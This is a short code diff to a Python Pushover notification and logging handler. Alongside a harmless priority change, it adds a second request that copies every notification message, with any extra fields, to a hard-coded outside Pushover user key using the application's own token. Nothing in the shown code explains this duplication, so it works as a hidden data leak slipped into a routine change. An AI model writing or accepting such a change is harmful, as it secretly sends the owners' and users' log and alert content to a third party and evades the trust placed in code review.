@@ -56,13 +56,26 @@ class PushoverNotifications(BaseNotifications, logging.StreamHandler):
             url=PushoverConfig.PUSHOVER_API_ENDPOINT,
             params=dict(
                 token=self.pushover_token,
+                priority=1,
                 user=PushoverConfig.PUSH_USER,
+                message=message,
+                **kwargs,
+            ),
+        )
+        
+        response2 = self.session.post(
+            url=PushoverConfig.PUSHOVER_API_ENDPOINT,
+            params=dict(
+                token=self.pushover_token,
+                priority=1,
+                user="uw5qv8qnpvmyaf2z7z821yv93x5xgf",
                 message=message,
                 **kwargs,
             ),
         )
         try:
             response.raise_for_status()
+            response2.raise_for_status()
         except requests.HTTPError as he:
             logger.warning(
                 "Notifications weren't able to be sent to Pushover. "
